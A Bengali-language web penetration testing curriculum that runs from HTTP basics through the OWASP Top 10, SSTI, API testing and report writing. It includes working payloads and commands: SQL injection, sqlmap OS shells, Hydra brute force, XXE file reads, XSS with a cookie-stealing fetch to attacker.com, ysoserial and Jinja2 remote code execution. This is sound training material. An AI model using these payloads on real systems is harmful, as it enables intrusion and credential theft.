# 🌐 Web Penetration Testing - সম্পূর্ণ গাইড
## Beginner থেকে Expert Level পর্যন্ত

---

## 📚 টেবিল অফ কন্টেন্টস

1. [মাস ১: Web Fundamentals](#month-1)
2. [মাস ২: Web Tools শেখা](#month-2)
3. [মাস ৩-৪: OWASP Top 10](#month-3-4)
4. [মাস ৫: Advanced Web Exploitation](#month-5)
5. [মাস ৬: API Security](#month-6)
6. [মাস ৭: Reporting & Lab Practice](#month-7)

---

## MONTH 1: Web Fundamentals (ওয়েব বেসিক্স) {#month-1}

### Week 1: HTTP Protocol বোঝা

#### HTTP Request Structure

```http
POST /login.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close

username=admin&password=pass
```

**গুরুত্বপূর্ণ অংশ:**
- **Request Line:** `POST /login.php HTTP/1.1`
- **Headers:** Additional information (Host, User-Agent, etc.)
- **Body:** Request data (form submission, JSON, etc.)

#### HTTP Response Structure

```http
HTTP/1.1 200 OK
Date: Mon, 28 Jun 2024 10:00:00 GMT
Server: Apache/2.4.41
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Set-Cookie: PHPSESSID=abcd1234

<html>
...
</html>
```

#### HTTP Methods

```
GET      - সার্ভার থেকে ডাটা নেওয়া (URL-এ parameter)
POST     - সার্ভার-এ ডাটা পাঠানো (body-তে)
PUT      - সম্পূর্ণ রিসোর্স আপডেট করা
DELETE   - রিসোর্স ডিলিট করা
PATCH    - আংশিক আপডেট করা
HEAD     - GET এর মতো কিন্তু body ছাড়া
OPTIONS  - সার্ভার-এর capabilities জানা
TRACE    - Request loop-back test
```

**HTTP Methods টেস্ট করা:**
```bash
# OPTIONS method দিয়ে allowed methods জানা
curl -X OPTIONS -v http://target.com

# HEAD request
curl -I http://target.com

# TRACE method (sometimes vulnerable)
curl -X TRACE -v http://target.com
```

#### HTTP Status Codes

```
1xx: Informational
  100 Continue
  101 Switching Protocols

2xx: Success
  200 OK
  201 Created
  204 No Content
  206 Partial Content

3xx: Redirection
  301 Moved Permanently
  302 Found (Temporary)
  304 Not Modified
  307 Temporary Redirect

4xx: Client Error
  400 Bad Request
  401 Unauthorized
  403 Forbidden
  404 Not Found
  405 Method Not Allowed
  409 Conflict

5xx: Server Error
  500 Internal Server Error
  501 Not Implemented
  502 Bad Gateway
  503 Service Unavailable
  505 HTTP Version Not Supported
```

#### HTTP Headers গুরুত্বপূর্ণ

```
Request Headers:
  Host              - ওয়েব সার্ভার hostname
  User-Agent        - ক্লায়েন্ট ব্রাউজার info
  Accept            - Accept করা content type
  Referer           - কোন পেজ থেকে এসেছি
  Cookie            - Client-side stored data
  Authorization     - Authentication info
  X-Forwarded-For   - Original client IP (proxies-এ)

Response Headers:
  Server            - ওয়েব সার্ভার টাইপ এবং ভার্শন
  Set-Cookie        - ক্লায়েন্ট-এ cookie সেট করা
  Content-Type      - Response content টাইপ
  Content-Length    - Response size
  Cache-Control     - Caching instructions
  X-Content-Type-Options - MIME-sniffing প্রতিরোধ
  X-Frame-Options   - Clickjacking প্রতিরোধ
  X-XSS-Protection  - XSS প্রতিরোধ
```

---

### Week 2: HTML, CSS, JavaScript বেসিক্স

#### HTML Structure

```html
<!DOCTYPE html>
<html>
<head>
    <title>Page Title</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <h1>Heading</h1>
    <p>Paragraph</p>
    <form>
        <input type="text" name="username">
        <input type="password" name="password">
        <button type="submit">Login</button>
    </form>
    <script src="script.js"></script>
</body>
</html>
```

**গুরুত্বপূর্ণ HTML Elements:**
```html
<input>         - Form input (text, password, hidden, etc.)
<form>          - Form submission container
<button>        - Clickable button
<textarea>      - Multi-line text input
<select>        - Dropdown list
<iframe>        - Embedded webpage
<script>        - JavaScript code
<img>           - Image element
<a>             - Hyperlink
```

#### HTML Form Attributes বোঝা

```html
<form action="/submit.php" method="POST" enctype="multipart/form-data">
    <!-- form content -->
</form>
```

- `action` - যেখানে form submit হবে
- `method` - GET বা POST
- `enctype` - Data encoding type (important for file uploads)

#### JavaScript Basics

**DOM Manipulation:**
```javascript
// Element select করা
document.getElementById("id")
document.getElementsByClassName("class")
document.querySelector(".class")

// Content change করা
document.getElementById("demo").innerHTML = "New content"

// Event handlers
element.onclick = function() { ... }
element.addEventListener("click", function() { ... })

// Console access (developer tools)
console.log("Debug message")
```

---

### Week 3: Web Server Architecture

#### Common Web Servers

```
Apache          - Most popular, modular design
Nginx           - High-performance, event-driven
IIS             - Windows-only
Node.js         - JavaScript runtime
```

#### Request Flow

```
User Browser
    ↓
  HTTP Request
    ↓
Web Server
    ↓
Application Server
    ↓
Database
    ↓
Response
    ↓
User Browser
```

---

### Week 4: Security Fundamentals

#### Authentication vs Authorization

```
Authentication: আপনি কে?
Authorization: আপনি কি করতে পারেন?
```

#### CVSS Scoring

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)

AV (Attack Vector): Network, Local
AC (Attack Complexity): Low, High
PR (Privileges Required): None, Low, High
UI (User Interaction): None, Required
S (Scope): Unchanged, Changed
C (Confidentiality): None, Low, High
I (Integrity): None, Low, High
A (Availability): None, Low, High
```

---

## MONTH 2: Web Tools শেখা {#month-2}

### Burp Suite Setup & Usage

#### Installation & Proxy Setup

```bash
# Browser-এ proxy config
Firefox Preferences → Network → Manual proxy
HTTP Proxy: 127.0.0.1
Port: 8080
```

#### Key Burp Suite Tabs

**1. Proxy Tab**
- সমস্ত HTTP/HTTPS traffic intercept করা
- Request/Response modify করা

**2. Repeater Tab**
- Individual request পাঠানো
- Request modify করে test করা

**3. Intruder Tab**
- Automated parameter fuzzing
- Brute force attacks

**Intruder Attack Types:**
```
Sniper:        একটি parameter test করা
Battering Ram: একই payload সব positions-এ
Pitchfork:     একাধিক parameters, একাধিক payloads
Cluster Bomb:  সব payload combinations
```

**4. Scanner Tab**
- Automated vulnerability scanning

**5. Decoder Tab**
- Encoding/Decoding বিভিন্ন format-এ
- Base64, URL, HTML, Hex

---

### OWASP ZAP

```bash
# Installation
sudo apt-get install zaproxy

# Docker
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target.com
```

---

## MONTH 3-4: OWASP Top 10 {#month-3-4}

### **A1: SQL Injection**

#### SQL Injection Payloads

```sql
-- Boolean-based
' OR '1'='1
' OR 1=1 --

-- UNION-based
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT username,password FROM users --

-- Time-based blind
' AND SLEEP(5) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

#### SQLMap Usage

```bash
# Basic scanning
sqlmap -u "http://target.com/user.php?id=1" --dbs

# Extract tables
sqlmap -u "http://target.com/user.php?id=1" -D database_name --tables

# Dump data
sqlmap -u "http://target.com/user.php?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://target.com/user.php?id=1" --os-shell
```

---

### **A2: Broken Authentication**

#### Default Credentials Test

```bash
users=("admin" "root" "test")
passwords=("admin" "password" "123456")

for user in "${users[@]}"; do
    for pass in "${passwords[@]}"; do
        curl -X POST http://target.com/login.php \
             -d "username=$user&password=$pass"
    done
done
```

#### Brute Force with Hydra

```bash
# HTTP form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-post-form://target.com:80 \
      "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
```

---

### **A3: Sensitive Data Exposure**

#### Information Gathering from JavaScript

```bash
# JavaScript files analysis
curl http://target.com/js/app.js

# API endpoints খোঁজা
grep -r "api/" . 
grep -r "apikey\|token\|password" .
```

#### Cookie & Header Analysis

```bash
# HTTP headers check
curl -I http://target.com

# Vulnerable header example
Server: Apache/2.4.41 (Ubuntu)  # Version disclosure
X-Powered-By: PHP/7.4.3         # Technology disclosure
```

---

### **A4: XML External Entity (XXE)**

#### XXE Payloads

```xml
<!-- File Read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<foo>&xxe;</foo>

<!-- DoS -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

---

### **A5: Broken Access Control (IDOR)**

#### IDOR Testing

```
Original: http://target.com/profile.php?user_id=123
Exploit:  http://target.com/profile.php?user_id=124 (অন্য user)
```

#### Automated IDOR Testing

```python
import requests

for user_id in range(1, 100):
    url = f"http://target.com/profile.php?user_id={user_id}"
    response = requests.get(url, cookies={"session": "your_session"})
    
    if "Not found" not in response.text:
        print(f"User {user_id}: Found!")
```

---

### **A6: Security Misconfiguration**

#### Directory Brute Force

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Common directories
/admin, /administrator, /admin/login, /wp-admin, /phpmyadmin
```

#### Default Files Check

```bash
curl http://target.com/admin
curl http://target.com/wp-admin
curl -I http://target.com | grep -i "server"  # Version disclosure
```

---

### **A7: Cross-Site Scripting (XSS)**

#### XSS Payloads

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
```

#### Cookie Stealing

```html
<script>
  fetch('http://attacker.com/steal.php?cookie=' + document.cookie)
</script>
```

#### XSS Testing

```bash
# Manual testing
http://target.com/search.php?q=<script>alert('XSS')</script>

# Check response
curl http://target.com/search.php?q=test | grep -i "<script>"
```

---

### **A8: Insecure Deserialization**

#### Java Serialization RCE

```bash
# ysoserial tool
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' > payload.bin

# Send payload
curl -X POST http://target.com/api/deserialize --data-binary @payload.bin
```

---

### **A9: Using Components with Known Vulnerabilities**

#### Vulnerability Detection

```bash
# npm projects
npm audit

# Python projects
safety check

# PHP projects
composer audit

# WordPress plugins
wpscan --url http://target.com --enumerate p
```

---

### **A10: Insufficient Logging & Monitoring**

#### Log Analysis

```bash
# Web server logs
cat /var/log/apache2/access.log
cat /var/log/nginx/access.log

# Application logs
cat /var/www/html/logs/error.log
```

---

## MONTH 5: Advanced Web Exploitation {#month-5}

### A11: Insecure File Upload

#### File Upload Bypass

```bash
# Extension manipulation
shell.php.jpg
shell.phtml
shell.php5
shell.php7

# Null byte (older systems)
shell.php%00.jpg

# MIME type bypass
# Send with Content-Type: image/jpeg কিন্তু PHP code
```

#### SVG Upload (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

### A12: Server-Side Template Injection (SSTI)

#### SSTI Detection

```bash
# Template expressions test
{{7*7}}
${7*7}
<%= 7*7 %>

# যদি "49" দেখা যায় → SSTI vulnerable!
```

#### Jinja2 RCE

```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}
```

#### Automated SSTI Finding

```bash
# Tplmap tool
python3 tplmap.py -u 'http://target.com/page?name=*' --engine jinja2
python3 tplmap.py -u 'http://target.com/page?name=*' --os-shell
```

---

### A13: LDAP Injection

#### LDAP Payloads

```
# Authentication bypass
Username: admin
Password: *)(uid=*

Query: (&(uid=admin)(userPassword=*)(uid=*))
Result: Always true!
```

---

## MONTH 6: API Security {#month-6}

### REST API Vulnerabilities

#### Common Issues

```
1. Broken Authentication
   - API key in URL
   - Default API keys
   - Expired keys still working

2. Missing Rate Limiting
   - Brute force users
   - Brute force passwords

3. Excessive Data Exposure
   - Sensitive data in response

4. Mass Assignment
   - Attacker adds extra parameters
   - Unintended fields modified

5. Broken Access Control
   - Access to admin functions
```

#### API Testing Tools

```bash
# Postman
# Create requests, modify parameters, test

# Burp Suite
# Capture API traffic, test different methods

# curl
curl -X GET http://target.com/api/users
curl -X POST http://target.com/api/users -d '{"name": "test"}'
curl -H "Authorization: Bearer token" http://target.com/api/users
```

### GraphQL Vulnerabilities

```graphql
# Introspection query
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Field exposure
query {
  user(id: 1) {
    id
    username
    email
    password  # ← Exposed?
  }
}
```

---

## MONTH 7: Reporting & Lab Practice {#month-7}

### Web PT Report Structure

```
1. Executive Summary (1-2 pages)
   - Overview
   - Key findings
   - Risk level

2. Detailed Findings
   - Organized by severity
   - Screenshots
   - Step-by-step reproduction

3. Risk Assessment
   - CVSS scores
   - Business impact

4. Recommendations
   - Immediate fixes
   - Long-term solutions

5. Appendices
   - Tools used
   - References
```

### Sample Finding

```markdown
## Finding #1: SQL Injection in User Search

### Severity: CRITICAL (CVSS 9.8)

### Description
SQL injection vulnerability in search parameter allows unauthorized database access.

### Proof of Concept
http://target.com/search.php?q=' UNION SELECT username,password FROM users--

### Impact
- Complete database compromise
- User credential exposure
- Potential remote code execution

### Recommendations
1. Use prepared statements
2. Input validation
3. Implement WAF
```

---

### Lab Practice Platforms

#### DVWA Setup

```bash
# Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Access: http://localhost/
# Default: admin/password
```

#### HackTheBox Web Challenges

**Easy Machines:**
- Previse
- Busqueda
- Socket

**Medium Machines:**
- Active
- Cronos
- Europa

#### TryHackMe Path

1. Introduction to Web Hacking
2. HTTP in Detail
3. Burp Suite
4. OWASP Top 10
5. Web Security Academy

---

### Web App Testing Checklists

#### WordPress PT Checklist

```
[ ] Plugin enumeration
[ ] Outdated plugins
[ ] wp-config.php exposure
[ ] Weak credentials
[ ] Arbitrary file upload
[ ] SQL injection
[ ] XSS vulnerabilities
```

#### PHP Application Checklist

```
[ ] SQL injection
[ ] File upload
[ ] Local/Remote file inclusion
[ ] XXE injection
[ ] SSTI
[ ] Weak sessions
[ ] Authentication bypass
```

#### Node.js/Express API Checklist

```
[ ] Authentication bypass
[ ] JWT vulnerabilities
[ ] No rate limiting
[ ] Mass assignment
[ ] NoSQL injection
[ ] Prototype pollution
```

---

## 📊 দৈনিক শেখার রুটিন

### সপ্তাহ ১-৪: ১.৫-২ ঘন্টা/দিন

```
সোমবার-বুধবার:
- 45 মিনিট: ভিডিও টিউটোরিয়াল
- 45 মিনিট: প্র্যাকটিক্যাল ডেমো

বৃহস্পতিবার-শুক্রবার:
- 1.5-2 ঘন্টা: Lab Practice

শনি-রবি:
- 1 ঘন্টা: রিভিউ
- 1 ঘন্টা: চ্যালেঞ্জ
```

---

## 📚 সুপারিশকৃত সম্পদ

### বই
1. **The Web Application Hacker's Handbook** - Stuttard & Pinto
2. **Web Security Testing Cookbook** - Stuttard et al.
3. **OWASP Testing Guide** - Free online
4. **Hacking APIs** - Corey Ball

### অনলাইন প্ল্যাটফর্ম
1. **PortSwigger Web Security Academy** - Free labs
2. **HackTheBox** - Web challenges
3. **TryHackMe** - Guided learning
4. **Udemy Web Hacking Courses**

### YouTube Channels
1. **LiveOverflow** - Web security
2. **John Hammond** - Web challenges
3. **IppSec** - Walkthroughs
4. **Computerphile** - Security concepts

---

## 🎯 Learning Milestones

### 3 মাসের লক্ষ্য

```
✓ HTTP protocol বোঝা
✓ Burp Suite দক্ষতা
✓ SQL Injection exploit করা
✓ XSS payloads তৈরি করা
✓ 10 HackTheBox machines সমাধান
✓ OWASP Top 10 বোঝা
```

### 6 মাসের লক্ষ্য

```
✓ Professional report লিখা
✓ IDOR exploit করা
✓ XXE execute করা
✓ SSTI exploitation করা
✓ API security testing
✓ 25 challenges সমাধান
✓ eWPT সার্টিফিকেশন প্রস্তুতি
```

### 12 মাসের লক্ষ্য

```
✓ Full web penetration test
✓ 50+ challenges solved
✓ eWPT / OSWE certification
✓ Custom security tools তৈরি
✓ Real client testing
✓ Advanced techniques
```

---

## ⚠️ নৈতিক মনে রাখার বিষয়

```
✓ সবসময় লিখিত অনুমোদন নিন
✓ স্কোপ মেনে চলুন
✓ সংবেদনশীল ডাটা সুরক্ষিত রাখুন
✓ দায়িত্বশীলভাবে রিপোর্ট করুন

✗ অননুমোদিত access করবেন না
✗ ডাটা চুরি করবেন না
✗ সিস্টেম নষ্ট করবেন না
```

---

**Last Updated:** June 2024
**Learning Duration:** 7 months intensive
**Focus:** Web Penetration Testing Only
**Level:** Beginner → Advanced
